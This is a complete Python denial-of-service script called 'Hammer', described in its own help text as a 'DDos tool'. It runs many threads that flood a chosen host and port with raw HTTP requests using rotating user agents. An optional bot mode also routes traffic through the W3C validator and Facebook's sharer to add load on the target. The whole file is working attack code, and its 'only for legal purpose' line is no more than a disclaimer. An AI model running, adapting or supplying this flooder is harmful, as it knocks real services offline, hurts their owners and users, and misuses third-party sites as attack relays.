#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Hammer Dos Script v.1
# by Can Yalçın
# only for legal purpose


from queue import Queue
import time
import sys
import os
import socket
import threading
import logging
import urllib.request
import random
import argparse


VERSION = '1.0'
AUTHOR = 'AneoPsy'


def user_agent():
    global uagent
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0;" +
                  " Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0)" +
                  " Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)" +
                  " Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)" +
                  " Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 " +
                  "(KHTML, like Gecko) Comodo_Dragon/16.1.1.0 " +
                  "Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; " +
                  "en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 " +
                  "(.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; " +
                  "en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    return(uagent)


def my_bots():
    global bots
    bots = []
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    return(bots)


def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            output = "\033[94mbot is hammering... \033[0m\r"
            sys.stdout.write(output)
            sys.stdout.flush()
            time.sleep(.1)
    except:
        time.sleep(.1)


def down_it(item):
    global i
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: " + host +
                         "\n\n User-Agent: " + random.choice(uagent) +
                         "\n"+data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                i += 1
                output = "\033[92m" + time.ctime(time.time()) + \
                         "\033[0m \033[94m[" + '*' * (i % 30) + \
                         (' ' * (30 - (i % 30))) + "]\033[92m " + host + \
                         ':' + str(port) + " -> " + str(i) + "\033[0m\r"
                sys.stdout.write(output)
                sys.stdout.flush()
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
            time.sleep(.1)
    except socket.error as e:
        output = "\033[91mNo connection!      \033[0m\r"
        sys.stdout.write(output)
        sys.stdout.flush()
        time.sleep(.1)


def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()


def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host)
        w.task_done()


def _cli_opts():
    '''
    Parse command line options.
    @returns the arguments
    '''

    global host
    global port
    global turbo

    mepath = str(os.path.abspath(sys.argv[0]))
    mebase = '%s' % (os.path.basename(mepath))

    description = '''DDos tool '''
    desc = argparse.RawDescriptionHelpFormatter
    parser = argparse.ArgumentParser(prog=mebase,
                                     formatter_class=desc,
                                     description=description,
                                     )
    parser.add_argument('-s', '--server',
                        action='store',
                        help='server',
                        required=True)
    parser.add_argument('-p', '--port',
                        action='store',
                        type=int,
                        default=80,
                        help='port')
    parser.add_argument('-t', '--turbo',
                        type=int,
                        default=135,
                        help='turbo')
    parser.add_argument('-b', '--bot',
                        action='store_true',
                        help='bot')
    parser.add_argument('-V', '--version',
                        action='version',
                        version='%(prog)s v' + VERSION + " by " + AUTHOR)

    args = parser.parse_args()

    host = args.server
    port = args.port
    turbo = args.turbo

    return args


if __name__ == '__main__':
    global data
    global i
    headers = open("headers.txt", "r")
    data = headers.read()
    headers.close()
    q = Queue()
    w = Queue()
    i = 0

    args = _cli_opts()

    print("\033[92m", host, " port: ", str(port),
          " turbo: ", str(turbo), "\033[0m")
    print("\033[94mPlease wait...\033[0m")
    user_agent()
    if args.bot:
        my_bots()
    time.sleep(1)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((args.server, int(args.port)))
        s.settimeout(1)
    except socket.error as e:
        print("\033[91mcheck server ip and port\033[0m")
    while True:
        for i in range(int(args.turbo)):
            t = threading.Thread(target=dos)
            t.daemon = True
            t.start()
            if args.bot:
                t2 = threading.Thread(target=dos2)
                t2.daemon = True
                t2.start()
        start = time.time()
        item = 0
        while True:
            if (item > 1800):
                item = 0
                time.sleep(.1)
                item = item + 1
            q.put(item)
            w.put(item)
        q.join()
        w.join()
